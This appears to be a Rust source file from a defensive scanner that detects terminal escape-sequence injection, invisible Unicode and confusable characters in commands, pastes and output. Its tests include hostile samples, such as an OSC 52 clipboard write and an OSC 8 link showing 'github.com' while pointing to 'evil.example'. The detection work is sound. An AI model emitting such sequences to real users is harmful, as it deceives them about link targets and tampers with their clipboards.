use once_cell::sync::Lazy;
use regex::Regex;

use crate::parse::{self, UrlLike};
use crate::tokenize::{self, Segment, ShellType};

/// Context for Tier 1 scanning.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScanContext {
    /// Exec-time: command about to be executed (check subcommand).
    Exec,
    /// Paste-time: content being pasted (paste subcommand).
    Paste,
    /// File scan: content read from a file (scan subcommand).
    /// Skips tier-1 fast-exit, runs byte scan + configfile rules only.
    FileScan,
}

impl std::str::FromStr for ScanContext {
    type Err = String;
    /// Parse the strict lowercase tokens (`exec`/`paste`/`file_scan`).
    /// Case-sensitive on purpose so a typo surfaces as a hard parse error.
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "exec" => Ok(ScanContext::Exec),
            "paste" => Ok(ScanContext::Paste),
            "file_scan" => Ok(ScanContext::FileScan),
            other => Err(format!("unknown scan context: {other}")),
        }
    }
}

// Include generated Tier 1 patterns from build.rs declarative pattern table.
#[allow(dead_code)]
mod tier1_generated {
    include!(concat!(env!("OUT_DIR"), "/tier1_gen.rs"));
}

/// Expose the build-time extractor IDs for test-time cross-referencing.
pub fn extractor_ids() -> &'static [&'static str] {
    tier1_generated::EXTRACTOR_IDS
}

/// Tier 1 exec-time regex — generated from declarative pattern table in build.rs.
static TIER1_EXEC_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(tier1_generated::TIER1_EXEC_PATTERN).expect("tier1 exec regex must compile")
});

/// Tier 1 paste-time regex — exec patterns PLUS paste-only patterns (e.g. non-ASCII).
static TIER1_PASTE_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(tier1_generated::TIER1_PASTE_PATTERN).expect("tier1 paste regex must compile")
});

/// Standard URL extraction regex for Tier 3.
static URL_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?:(?:https?|ftp|ssh|git)://[^\s'"<>]+)|(?:[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:[^\s'"<>]+)"#,
    )
    .expect("url regex must compile")
});

/// Control character patterns for paste-time byte scanning.
pub struct ByteScanResult {
    pub has_ansi_escapes: bool,
    pub has_control_chars: bool,
    pub has_bidi_controls: bool,
    pub has_zero_width: bool,
    pub has_invalid_utf8: bool,
    pub has_unicode_tags: bool,
    pub has_variation_selectors: bool,
    pub has_invisible_math_operators: bool,
    pub has_invisible_whitespace: bool,
    pub has_hangul_fillers: bool,
    pub has_confusable_text: bool,
    pub details: Vec<ByteFinding>,
}

pub struct ByteFinding {
    pub offset: usize,
    pub byte: u8,
    /// Full Unicode codepoint for multi-byte characters (None for single-byte findings).
    pub codepoint: Option<u32>,
    pub description: String,
}

impl ByteScanResult {
    /// Return a filtered view dropping findings whose offset falls inside
    /// `ignore`, with `has_*` flags re-derived from the survivors so tier-1/
    /// tier-3 gates stay consistent. Used by the inspection-subcommand carveout
    /// (inert arg span of `tirith diff/score/why/...`). `has_invalid_utf8` is a
    /// whole-input property and is left unchanged.
    pub fn with_ignored_range(mut self, ignore: &std::ops::Range<usize>) -> Self {
        self.details.retain(|d| !ignore.contains(&d.offset));
        // Re-derive flags from surviving details, matched on the description
        // prefixes that correspond to each branch in `scan_bytes`.
        self.has_ansi_escapes = false;
        self.has_control_chars = false;
        self.has_bidi_controls = false;
        self.has_zero_width = false;
        self.has_unicode_tags = false;
        self.has_variation_selectors = false;
        self.has_invisible_math_operators = false;
        self.has_invisible_whitespace = false;
        self.has_hangul_fillers = false;
        self.has_confusable_text = false;
        for d in &self.details {
            let desc = d.description.as_str();
            if desc.ends_with("escape sequence") || desc == "trailing escape byte" {
                self.has_ansi_escapes = true;
            } else if desc.starts_with("control character") {
                self.has_control_chars = true;
            } else if desc.starts_with("bidi control") {
                self.has_bidi_controls = true;
            } else if desc.starts_with("zero-width character") {
                self.has_zero_width = true;
            } else if desc.starts_with("unicode tag") {
                self.has_unicode_tags = true;
            } else if desc.starts_with("variation selector") {
                self.has_variation_selectors = true;
            } else if desc.starts_with("invisible math operator") {
                self.has_invisible_math_operators = true;
            } else if desc.starts_with("invisible whitespace") {
                self.has_invisible_whitespace = true;
            } else if desc.starts_with("hangul filler") {
                self.has_hangul_fillers = true;
            } else if desc.starts_with("confusable") || desc.starts_with("text confusable") {
                self.has_confusable_text = true;
            }
        }
        self
    }
}

/// Tier 1: Fast scan for URL-like content. Returns true if full analysis needed.
pub fn tier1_scan(input: &str, context: ScanContext) -> bool {
    match context {
        ScanContext::Exec => TIER1_EXEC_REGEX.is_match(input),
        ScanContext::Paste => TIER1_PASTE_REGEX.is_match(input),
        // FileScan always proceeds to tier-3 (no fast-exit)
        ScanContext::FileScan => true,
    }
}

/// Scan raw bytes for control characters (paste-time, Tier 1 step 1).
pub fn scan_bytes(input: &[u8]) -> ByteScanResult {
    let mut result = ByteScanResult {
        has_ansi_escapes: false,
        has_control_chars: false,
        has_bidi_controls: false,
        has_zero_width: false,
        has_invalid_utf8: false,
        has_unicode_tags: false,
        has_variation_selectors: false,
        has_invisible_math_operators: false,
        has_invisible_whitespace: false,
        has_hangul_fillers: false,
        has_confusable_text: false,
        details: Vec::new(),
    };

    // Check for invalid UTF-8
    if std::str::from_utf8(input).is_err() {
        result.has_invalid_utf8 = true;
    }

    let len = input.len();
    let mut i = 0;
    while i < len {
        let b = input[i];

        if b == 0x1b {
            // CSI (\e[), OSC (\e]), APC (\e_), DCS (\eP): escape-sequence
            // introducers used for terminal injection attacks.
            if i + 1 < len {
                let next = input[i + 1];
                if next == b'[' || next == b']' || next == b'_' || next == b'P' {
                    result.has_ansi_escapes = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: None,
                        description: match next {
                            b'[' => "CSI escape sequence",
                            b']' => "OSC escape sequence",
                            b'_' => "APC escape sequence",
                            b'P' => "DCS escape sequence",
                            _ => "escape sequence",
                        }
                        .to_string(),
                    });
                    i += 2;
                    continue;
                }
            } else {
                result.has_ansi_escapes = true;
                result.details.push(ByteFinding {
                    offset: i,
                    byte: b,
                    codepoint: None,
                    description: "trailing escape byte".to_string(),
                });
            }
        }

        // CR: only flag mid-stream CRs (display-overwriting attacks). Trailing
        // CR and CRLF (Windows line endings) are benign clipboard artifacts.
        if b == b'\r' {
            let is_attack_cr = i + 1 < len && input[i + 1] != b'\n';
            if is_attack_cr {
                result.has_control_chars = true;
                result.details.push(ByteFinding {
                    offset: i,
                    byte: b,
                    codepoint: None,
                    description: format!("control character 0x{b:02x}"),
                });
            }
        } else if b < 0x20 && b != b'\n' && b != b'\t' && b != 0x1b {
            result.has_control_chars = true;
            result.details.push(ByteFinding {
                offset: i,
                byte: b,
                codepoint: None,
                description: format!("control character 0x{b:02x}"),
            });
        }

        if b == 0x7F {
            result.has_control_chars = true;
            result.details.push(ByteFinding {
                offset: i,
                byte: b,
                codepoint: None,
                description: "control character 0x7f (DEL)".to_string(),
            });
        }

        // UTF-8 continuation byte? Decode the char and check it against every
        // invisible/confusable class in one pass.
        if b >= 0xc0 {
            let remaining = &input[i..];
            if let Some(ch) = std::str::from_utf8(remaining)
                .ok()
                .or_else(|| std::str::from_utf8(&remaining[..remaining.len().min(4)]).ok())
                .and_then(|s| s.chars().next())
            {
                if is_bidi_control(ch) {
                    result.has_bidi_controls = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("bidi control U+{:04X}", ch as u32),
                    });
                }
                // ZWSP, ZWNJ, ZWJ, BOM, CGJ, Soft Hyphen, Word Joiner.
                // BOM (U+FEFF) at offset 0 is a file-encoding artifact, not an attack.
                if is_zero_width(ch) && !(ch == '\u{FEFF}' && i == 0) {
                    result.has_zero_width = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("zero-width character U+{:04X}", ch as u32),
                    });
                }
                // Unicode Tags U+E0000–U+E007F (hidden-ASCII encoding).
                if is_unicode_tag(ch) {
                    result.has_unicode_tags = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("unicode tag U+{:04X}", ch as u32),
                    });
                }
                // U+FE00–U+FE0F and U+E0100–U+E01EF.
                if is_variation_selector(ch) {
                    result.has_variation_selectors = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("variation selector U+{:04X}", ch as u32),
                    });
                }
                // U+2061–U+2064.
                if is_invisible_math_operator(ch) {
                    result.has_invisible_math_operators = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("invisible math operator U+{:04X}", ch as u32),
                    });
                }
                // Invisible whitespace (stealth-encoded spaces).
                if is_invisible_whitespace(ch) {
                    result.has_invisible_whitespace = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("invisible whitespace U+{:04X}", ch as u32),
                    });
                }
                if is_hangul_filler(ch) {
                    result.has_hangul_fillers = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!("hangul filler U+{:04X}", ch as u32),
                    });
                }
                // Math alphanumerics + hostname confusables.
                if let Some(target) = crate::text_confusables::is_text_confusable(ch) {
                    result.has_confusable_text = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!(
                            "text confusable U+{:04X} (looks like '{target}')",
                            ch as u32
                        ),
                    });
                } else if let Some(target) = crate::confusables::is_confusable(ch) {
                    result.has_confusable_text = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        codepoint: Some(ch as u32),
                        description: format!(
                            "confusable U+{:04X} (looks like '{target}')",
                            ch as u32
                        ),
                    });
                }
                i += ch.len_utf8();
                continue;
            }
        }

        i += 1;
    }

    result
}

// Output-stream byte scanning (M7 ch1): a streaming scanner for terminal
// output escape sequences (OSC 52 clipboard write, OSC 8 hyperlink, OSC 0/2
// title, CSI 2J/H screen clear, SGR `\e[...m`). Callers feed 64 KiB chunks and
// the small (non-full-VT) state machine carries partial-sequence context across
// chunk boundaries (e.g. `\e]52;` split between two chunks).

/// A single OSC 8 hyperlink span recovered from output (uri + visible label).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutputHyperlinkHit {
    pub offset: usize,
    pub uri: String,
    pub visible: String,
}

/// A single SGR escape sequence (`\e[...m`) recovered from output, with its
/// parsed numeric params. Used by the hidden-text rule to spot `fg == bg`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutputSgrHit {
    pub offset: usize,
    pub params: Vec<u32>,
}

/// Rolling state for [`scan_output_chunk`], persisted across chunks so OSC/CSI/
/// SGR sequences split across chunks are detected end-to-end. Zero-width runs
/// are chunk-local (the v1 hidden-text threshold is well within a 64 KiB window).
#[derive(Debug, Default, Clone)]
pub struct OutputScanState {
    /// Absolute byte offset of the *next* byte to be fed in, so emitted offsets
    /// are file-wide. The streaming driver bumps this by each chunk's length.
    pub byte_offset: usize,
    phase: OutputPhase,
    osc_buf: Vec<u8>,
    /// OSC introducer (`0`, `2`, `52`, `8`): accumulate digits, dispatch on `;`.
    osc_introducer: Vec<u8>,
    sgr_buf: Vec<u8>,
    /// Reserved (unused): the chunk-boundary lone-`\e` case is already handled
    /// via `OutputPhase::AfterEsc` carrying across chunks. Kept to preserve
    /// struct ABI for callers constructing this manually. See code-reviewer #4.
    #[allow(dead_code)]
    saw_lone_esc: bool,
    /// Set when, inside [`OutputPhase::InOsc`], we saw `\e` — the next byte may
    /// be the OSC ST terminator (`\\`); if so we finalize, else resume payload.
    osc_pending_st: bool,
    /// For OSC 8: after `\e]8;PARAMS;URI<ST>` we collect the visible text until
    /// the `\e]8;;<ST>` closer.
    osc8_active_uri: Option<String>,
    osc8_visible_buf: Vec<u8>,
    osc8_uri_start_offset: usize,
}

/// Hard cap on payload bytes buffered inside one escape sequence; a larger
/// sequence is aborted back to copy-through mode (legit OSC 8 URIs are KiB-sized).
const OUTPUT_OSC_CAP: usize = 16 * 1024;

#[derive(Debug, Default, Clone, PartialEq, Eq)]
enum OutputPhase {
    #[default]
    Idle,
    /// Just saw `\e`, waiting for next byte.
    AfterEsc,
    /// Inside `\e[…` waiting for a final byte in 0x40..=0x7E.
    InCsi,
    /// Inside `\e]…` (OSC): collecting the introducer + payload.
    InOsc,
    /// OSC 8 link open: collecting visible text between `\e]8;…<ST>` and
    /// the closing `\e]8;;<ST>`.
    InOsc8Visible,
}

/// Aggregate results from one or more streamed chunks (offsets are file-wide).
#[derive(Debug, Default, Clone)]
pub struct OutputScanResult {
    /// OSC 52 clipboard write sequences.
    pub osc52: Vec<OutputOscHit>,
    /// OSC 0 / OSC 2 title-set sequences.
    pub title_set: Vec<OutputOscHit>,
    /// Explicit `\e[2J` / `\e[H` screen-clear sequences.
    pub screen_clear: Vec<OutputOscHit>,
    /// OSC 8 hyperlinks with their visible label captured.
    pub hyperlinks: Vec<OutputHyperlinkHit>,
    /// SGR sequences (used by the hidden-text rule).
    pub sgr: Vec<OutputSgrHit>,
    /// Runs of zero-width characters longer than the v1 threshold (8 chars).
    pub zero_width_runs: Vec<OutputZeroWidthRun>,
}

/// One generic OSC hit (file-wide offset + decoded payload).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutputOscHit {
    pub offset: usize,
    pub payload: String,
}

/// A run of >8 consecutive zero-width characters detected by the output scan.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutputZeroWidthRun {
    pub offset: usize,
    pub count: usize,
}

/// Streaming output scanner — drive with 64 KiB chunks; `state` carries across
/// calls so a sequence split on a chunk boundary is still detected end-to-end.
/// Findings are *appended* to `result`; `engine::analyze_output_*` translates
/// it into `Finding`s after all chunks are fed.
pub fn scan_output_chunk(chunk: &[u8], state: &mut OutputScanState, result: &mut OutputScanResult) {
    // Track consecutive zero-width chars within THIS chunk only — runs that
    // straddle a chunk boundary intentionally do NOT count (the >8 v1 threshold
    // is well within a 64 KiB window), keeping the state machine compact.
    let mut zw_run_start: Option<usize> = None;
    let mut zw_run_count: usize = 0;
    let chunk_start_offset = state.byte_offset;

    let mut byte_idx = 0;
    while byte_idx < chunk.len() {
        let b = chunk[byte_idx];

        // Handle phase transitions first.
        match state.phase {
            OutputPhase::Idle | OutputPhase::InOsc8Visible => {
                if b == 0x1B {
                    state.phase = OutputPhase::AfterEsc;
                    state.saw_lone_esc = false;
                    byte_idx += 1;
                    continue;
                }
                if state.phase == OutputPhase::InOsc8Visible {
                    state.osc8_visible_buf.push(b);
                    if state.osc8_visible_buf.len() > OUTPUT_OSC_CAP {
                        // Bail — visible text is unreasonably large, abort the link.
                        state.phase = OutputPhase::Idle;
                        state.osc8_active_uri = None;
                        state.osc8_visible_buf.clear();
                    }
                }
            }
            OutputPhase::AfterEsc => {
                match b {
                    b'[' => {
                        state.phase = OutputPhase::InCsi;
                        state.sgr_buf.clear();
                    }
                    b']' => {
                        state.phase = OutputPhase::InOsc;
                        state.osc_introducer.clear();
                        state.osc_buf.clear();
                    }
                    b'\\' => {
                        // Standalone `\e\\` (ST in idle context) — no-op.
                        state.phase = OutputPhase::Idle;
                    }
                    _ => {
                        // Bail to idle on any non-control byte (not a full VT100 parser).
                        state.phase = OutputPhase::Idle;
                    }
                }
                byte_idx += 1;
                continue;
            }
            OutputPhase::InCsi => {
                // SGR sequences end with `m`; we only care about parameter
                // bytes (0x30..=0x3F) and final bytes (0x40..=0x7E).
                if (0x40..=0x7E).contains(&b) {
                    // `-2` for `\e[`. `saturating_sub` clamps to 0 for the
                    // cross-chunk case (the `\e[` in chunk N, final byte in N+1)
                    // where the naive subtraction would underflow usize.
                    let abs_offset = (chunk_start_offset + byte_idx)
                        .saturating_sub(state.sgr_buf.len())
                        .saturating_sub(2);
                    if b == b'm' {
                        // Parse SGR params: ";"-separated decimal ints; empty = 0.
                        let params = parse_sgr_params(&state.sgr_buf);
                        result.sgr.push(OutputSgrHit {
                            offset: abs_offset,
                            params,
                        });
                    } else if b == b'J' && state.sgr_buf == b"2" {
                        result.screen_clear.push(OutputOscHit {
                            offset: abs_offset,
                            payload: "\\e[2J".to_string(),
                        });
                    } else if b == b'H' && state.sgr_buf.is_empty() {
                        result.screen_clear.push(OutputOscHit {
                            offset: abs_offset,
                            payload: "\\e[H".to_string(),
                        });
                    }
                    state.phase = OutputPhase::Idle;
                    state.sgr_buf.clear();
                } else {
                    state.sgr_buf.push(b);
                    if state.sgr_buf.len() > 64 {
                        // Unreasonable CSI length — bail.
                        state.phase = OutputPhase::Idle;
                        state.sgr_buf.clear();
                    }
                }
                byte_idx += 1;
                continue;
            }
            OutputPhase::InOsc => {
                // Terminators: BEL (\a, 0x07) or ST (\e\\). Also tolerant of
                // bare 0x9C (8-bit ST, rare in modern terminals).
                let is_bel = b == 0x07;
                let is_st_8bit = b == 0x9C;
                let is_st_start = b == 0x1B;

                // Were we waiting for the ST tail (`\\`) after a `\e`?
                if state.osc_pending_st {
                    state.osc_pending_st = false;
                    if b == b'\\' {
                        finalize_osc(state, result, chunk_start_offset, byte_idx);
                        byte_idx += 1;
                        continue;
                    }
                    // False alarm: that `\e` was a stray payload byte (an
                    // attempted terminator). Drop it as protocol noise, keep going.
                }

                if is_bel || is_st_8bit {
                    finalize_osc(state, result, chunk_start_offset, byte_idx);
                    byte_idx += 1;
                    continue;
                }
                if is_st_start {
                    // Stay InOsc; flip the pending-ST flag and wait one byte.
                    state.osc_pending_st = true;
                    byte_idx += 1;
                    continue;
                }
                if state.osc_introducer.contains(&b';') {
                    // Past the introducer separator — accumulate payload.
                    state.osc_buf.push(b);
                    if state.osc_buf.len() > OUTPUT_OSC_CAP {
                        state.phase = OutputPhase::Idle;
                        state.osc_buf.clear();
                        state.osc_introducer.clear();
                    }
                } else {
                    state.osc_introducer.push(b);
                    if state.osc_introducer.len() > 32 {
                        state.phase = OutputPhase::Idle;
                        state.osc_buf.clear();
                        state.osc_introducer.clear();
                    }
                }
                byte_idx += 1;
                continue;
            }
        }

        // Idle-mode zero-width tracking (multi-byte chars).
        if state.phase == OutputPhase::Idle && b >= 0xc0 {
            let remaining = &chunk[byte_idx..];
            if let Some(ch) = std::str::from_utf8(remaining)
                .ok()
                .or_else(|| std::str::from_utf8(&remaining[..remaining.len().min(4)]).ok())
                .and_then(|s| s.chars().next())
            {
                if is_zero_width(ch) || is_unicode_tag(ch) {
                    if zw_run_start.is_none() {
                        zw_run_start = Some(chunk_start_offset + byte_idx);
                    }
                    zw_run_count += 1;
                    byte_idx += ch.len_utf8();
                    continue;
                }
            }
        }

        // Non-ZW byte — flush any in-flight run.
        if zw_run_count > 8 {
            if let Some(off) = zw_run_start {
                result.zero_width_runs.push(OutputZeroWidthRun {
                    offset: off,
                    count: zw_run_count,
                });
            }
        }
        zw_run_start = None;
        zw_run_count = 0;

        byte_idx += 1;
    }

    // End-of-chunk ZW flush.
    if zw_run_count > 8 {
        if let Some(off) = zw_run_start {
            result.zero_width_runs.push(OutputZeroWidthRun {
                offset: off,
                count: zw_run_count,
            });
        }
    }

    // Advance global offset for next chunk.
    state.byte_offset = chunk_start_offset + chunk.len();
}

/// Whole-buffer wrapper for the streaming scanner (used by `engine::analyze_output`).
pub fn scan_output_bytes(input: &[u8]) -> OutputScanResult {
    let mut state = OutputScanState::default();
    let mut result = OutputScanResult::default();
    scan_output_chunk(input, &mut state, &mut result);
    // Flush any trailing in-flight sequence so a truncated `\e]52;…` at EOF
    // is detected instead of silently dropped.
    finalize_scan_state(&mut state);
    result
}

/// End-of-stream scanner status. Lets the output filter (and `tirith view`)
/// flag an unterminated escape sequence — fail-closed callers must DENY then.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct OutputScanFinalize {
    /// `true` when an OSC / CSI / OSC8-visible sequence was in-flight at EOF.
    /// Worst case: a truncated `\e]52;…` (partial clipboard write) the original
    /// implementation silently dropped.
    pub truncated_escape: bool,
    /// `true` when the truncation was an OSC `52;` (clipboard write); callers
    /// can elevate severity.
    pub truncated_osc52: bool,
}

/// Finalize scanner state at EOF: reset transient state for reuse and report
/// what (if anything) was in-flight. Called by `scan_output_bytes` and
/// `engine::analyze_output_finalize`.
///
/// Silent-failure fix (Sev-5): pre-fix the scanner ended in `InOsc` /
/// `InOsc8Visible` silently on truncation and the output filter accepted it;
/// callers can now emit an `OutputTruncatedEscapeSequence` finding.
pub fn finalize_scan_state(state: &mut OutputScanState) -> OutputScanFinalize {
    let mut out = OutputScanFinalize::default();
    let in_flight = !matches!(state.phase, OutputPhase::Idle);
    if in_flight {
        out.truncated_escape = true;
        // The introducer accumulates digits until the first `;`, so a leading
        // "52" is a definitive clipboard-write signal even mid-payload.
        if matches!(state.phase, OutputPhase::InOsc) {
            let head: Vec<u8> = state
                .osc_introducer
                .iter()
                .copied()
                .take_while(|b| *b != b';')
                .collect();
            if head.starts_with(b"52") {
                out.truncated_osc52 = true;
            }
        }
        // Reset transient state so re-use of `state` is safe.
        state.phase = OutputPhase::Idle;
        state.osc_buf.clear();
        state.osc_introducer.clear();
        state.sgr_buf.clear();
        state.saw_lone_esc = false;
        state.osc_pending_st = false;
        state.osc8_active_uri = None;
        state.osc8_visible_buf.clear();
    }
    out
}

/// Parse an SGR parameter byte string (e.g. `b"38;5;208;48;5;240"`) into a
/// list of integers. Empty fields default to 0, matching xterm semantics.
fn parse_sgr_params(buf: &[u8]) -> Vec<u32> {
    let s = std::str::from_utf8(buf).unwrap_or("");
    s.split(';')
        .map(|tok| tok.trim().parse::<u32>().unwrap_or(0))
        .collect()
}

/// Finalize an in-progress OSC sequence (terminator hit). Dispatches on the
/// introducer (`0`, `2`, `8`, `52`) and either records the finding or opens
/// the OSC 8 visible-text capture.
fn finalize_osc(
    state: &mut OutputScanState,
    result: &mut OutputScanResult,
    chunk_start_offset: usize,
    byte_idx: usize,
) {
    state.osc_pending_st = false;
    // Offset of the introducing `\e]`: subtract the bytes consumed since it.
    // saturating_sub handles the cross-chunk case (opener in N, terminator in N+1).
    let consumed = state.osc_introducer.len() + state.osc_buf.len() + 2; // +2 for `\e]`
    let abs_offset = (chunk_start_offset + byte_idx).saturating_sub(consumed);

    // Split introducer on the first `;` into numeric head + payload params.
    let mut head_buf: Vec<u8> = Vec::new();
    let mut rest_buf: Vec<u8> = Vec::new();
    let mut seen_semi = false;
    for &b in &state.osc_introducer {
        if !seen_semi && b == b';' {
            seen_semi = true;
            continue;
        }
        if seen_semi {
            rest_buf.push(b);
        } else {
            head_buf.push(b);
        }
    }

    let head = std::str::from_utf8(&head_buf).unwrap_or("").trim();
    let payload_str = std::str::from_utf8(&state.osc_buf)
        .unwrap_or("")
        .to_string();
    let rest_str = std::str::from_utf8(&rest_buf).unwrap_or("");

    match head {
        "0" | "2" => {
            result.title_set.push(OutputOscHit {
                offset: abs_offset,
                payload: format!("{rest_str}{payload_str}"),
            });
            state.phase = OutputPhase::Idle;
            state.osc_introducer.clear();
            state.osc_buf.clear();
        }
        "52" => {
            result.osc52.push(OutputOscHit {
                offset: abs_offset,
                payload: payload_str,
            });
            state.phase = OutputPhase::Idle;
            state.osc_introducer.clear();
            state.osc_buf.clear();
        }
        "8" => {
            // OSC 8 shape: `\e]8;params;uri\e\\<visible>\e]8;;\e\\`. Our
            // split-on-first-semi leaves the payload as `;uri`; strip one
            // leading `;` so the URI handed to the rule layer is clean. (On the
            // closer `\e]8;;\e\\` payload_str is `";"`/empty — ignored below.)
            let stripped_uri = payload_str
                .strip_prefix(';')
                .unwrap_or(&payload_str)
                .to_string();
            let uri = stripped_uri;
            if state.osc8_active_uri.is_some() {
                // This is the CLOSER — emit the captured link.
                let visible = std::str::from_utf8(&state.osc8_visible_buf)
                    .unwrap_or("")
                    .to_string();
                let captured_uri = state.osc8_active_uri.take().unwrap_or_default();
                result.hyperlinks.push(OutputHyperlinkHit {
                    offset: state.osc8_uri_start_offset,
                    uri: captured_uri,
                    visible,
                });
                state.osc8_visible_buf.clear();
                state.phase = OutputPhase::Idle;
            } else {
                // OPENER — start collecting the visible label.
                state.osc8_active_uri = Some(uri);
                state.osc8_uri_start_offset = abs_offset;
                state.osc8_visible_buf.clear();
                state.phase = OutputPhase::InOsc8Visible;
            }
            state.osc_introducer.clear();
            state.osc_buf.clear();
        }
        _ => {
            // Unknown OSC code — ignore (no finding) but reset state.
            state.phase = OutputPhase::Idle;
            state.osc_introducer.clear();
            state.osc_buf.clear();
        }
    }
}

#[cfg(test)]
mod output_scan_tests {
    use super::*;

    #[test]
    fn detects_osc52_clipboard_write() {
        let input = b"hello\x1b]52;c;aGVsbG8=\x07world";
        let result = scan_output_bytes(input);
        assert_eq!(result.osc52.len(), 1, "should detect OSC 52");
        // Payload format: `<selector>;<base64>` — `c` = clipboard
        assert_eq!(result.osc52[0].payload, "c;aGVsbG8=");
    }

    #[test]
    fn detects_osc52_with_st_terminator() {
        let input = b"hello\x1b]52;c;aGVsbG8=\x1b\\world";
        let result = scan_output_bytes(input);
        assert_eq!(
            result.osc52.len(),
            1,
            "should detect OSC 52 with ST terminator"
        );
    }

    #[test]
    fn detects_title_set() {
        let input = b"\x1b]0;Untitled\x07rest";
        let result = scan_output_bytes(input);
        assert_eq!(result.title_set.len(), 1);
        assert_eq!(result.title_set[0].payload, "Untitled");
    }

    #[test]
    fn detects_screen_clear() {
        let input = b"banner\x1b[2Jfresh\x1b[H";
        let result = scan_output_bytes(input);
        assert_eq!(result.screen_clear.len(), 2);
    }

    #[test]
    fn detects_osc8_hyperlink_with_mismatch() {
        let input = b"click \x1b]8;;https://evil.example\x1b\\github.com\x1b]8;;\x1b\\!";
        let result = scan_output_bytes(input);
        assert_eq!(result.hyperlinks.len(), 1, "should detect OSC 8");
        assert_eq!(result.hyperlinks[0].uri, "https://evil.example");
        assert_eq!(result.hyperlinks[0].visible, "github.com");
    }

    #[test]
    fn streaming_split_on_osc_boundary() {
        // Split `\x1b]52;c;aGVsbG8=\x07` between `\x1b]` and `52;…\x07`.
        let mut state = OutputScanState::default();
        let mut result = OutputScanResult::default();
        scan_output_chunk(b"hello\x1b]", &mut state, &mut result);
        scan_output_chunk(b"52;c;aGVsbG8=\x07world", &mut state, &mut result);
        assert_eq!(
            result.osc52.len(),
            1,
            "OSC 52 must be detected even when split across chunks"
        );
        assert_eq!(result.osc52[0].payload, "c;aGVsbG8=");
    }

    #[test]
    fn finalize_flags_truncated_osc52() {
        // Sev-5 silent-failure regression: a `\e]52;…` that ends mid-payload
        // (no BEL / no ST) used to leave `phase=InOsc` and produce no
        // finding. `finalize_scan_state` must flag it.
        let mut state = OutputScanState::default();
        let mut result = OutputScanResult::default();
        scan_output_chunk(b"hello\x1b]52;c;aGVsbG8", &mut state, &mut result);
        let fin = finalize_scan_state(&mut state);
        assert!(fin.truncated_escape, "truncated OSC must flag in-flight");
        assert!(
            fin.truncated_osc52,
            "OSC introducer 52 → osc52-specific flag"
        );
        assert_eq!(result.osc52.len(), 0, "no terminator → no OSC52 hit");
    }

    #[test]
    fn finalize_clean_eof_is_no_op() {
        let mut state = OutputScanState::default();
        let mut result = OutputScanResult::default();
        scan_output_chunk(b"hello world\n", &mut state, &mut result);
        let fin = finalize_scan_state(&mut state);
        assert!(!fin.truncated_escape);
        assert!(!fin.truncated_osc52);
    }

    #[test]
    fn finalize_flags_non_osc52_truncation() {
        // CSI sequence that never reaches a final byte.
        let mut state = OutputScanState::default();
        let mut result = OutputScanResult::default();
        scan_output_chunk(b"prefix\x1b[31", &mut state, &mut result);
        let fin = finalize_scan_state(&mut state);
        assert!(fin.truncated_escape);
        assert!(!fin.truncated_osc52, "CSI != OSC52");
    }

    #[test]
    fn captures_sgr_params() {
        let input = b"\x1b[37;47mhidden\x1b[0m";
        let result = scan_output_bytes(input);
        assert_eq!(result.sgr.len(), 2, "should capture both SGRs");
        assert_eq!(result.sgr[0].params, vec![37, 47]);
        assert_eq!(result.sgr[1].params, vec![0]);
    }

    #[test]
    fn detects_zero_width_run() {
        let mut input = b"abc".to_vec();
        for _ in 0..10 {
            input.extend_from_slice("\u{200B}".as_bytes());
        }
        input.extend_from_slice(b"def");
        let result = scan_output_bytes(&input);
        assert_eq!(result.zero_width_runs.len(), 1);
        assert_eq!(result.zero_width_runs[0].count, 10);
    }

    #[test]
    fn clean_text_no_findings() {
        let result = scan_output_bytes(b"hello world\n");
        assert!(result.osc52.is_empty());
        assert!(result.title_set.is_empty());
        assert!(result.screen_clear.is_empty());
        assert!(result.hyperlinks.is_empty());
        assert!(result.zero_width_runs.is_empty());
    }
}

/// Check if a character is a bidi control.
fn is_bidi_control(ch: char) -> bool {
    matches!(
        ch,
        '\u{200E}' // LRM
        | '\u{200F}' // RLM
        | '\u{202A}' // LRE
        | '\u{202B}' // RLE
        | '\u{202C}' // PDF
        | '\u{202D}' // LRO
        | '\u{202E}' // RLO
        | '\u{2066}' // LRI
        | '\u{2067}' // RLI
        | '\u{2068}' // FSI
        | '\u{2069}' // PDI
    )
}

/// Check if a character is zero-width.
fn is_zero_width(ch: char) -> bool {
    matches!(
        ch,
        '\u{180E}' // Mongolian Vowel Separator
        | '\u{200B}' // ZWSP
        | '\u{200C}' // ZWNJ
        | '\u{200D}' // ZWJ
        | '\u{FEFF}' // BOM / ZWNBSP
        | '\u{034F}' // Combining Grapheme Joiner
        | '\u{00AD}' // Soft Hyphen
        | '\u{2060}' // Word Joiner
    )
}

/// Check if a character is a Unicode Tag (hidden ASCII encoding).
fn is_unicode_tag(ch: char) -> bool {
    ('\u{E0000}'..='\u{E007F}').contains(&ch)
}

/// Check if a character is a variation selector (VS1-16 or VS17-256).
